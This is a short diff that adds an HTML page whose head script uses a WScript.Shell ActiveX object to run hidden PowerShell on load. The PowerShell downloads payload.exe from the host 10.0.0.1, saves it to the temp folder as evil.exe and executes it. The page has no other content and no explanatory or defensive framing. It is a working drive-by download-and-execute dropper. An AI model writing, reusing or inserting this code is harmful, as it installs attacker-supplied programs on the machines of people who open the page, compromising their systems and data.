@@ -1,0 +1,7 @@
+<html>
+<head><script>
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run("powershell -w hidden -c Invoke-WebRequest http://10.0.0.1/payload.exe -OutFile $env:TEMP\\evil.exe; Start-Process $env:TEMP\\evil.exe");
+</script></head>
+<body></body>
+</html>
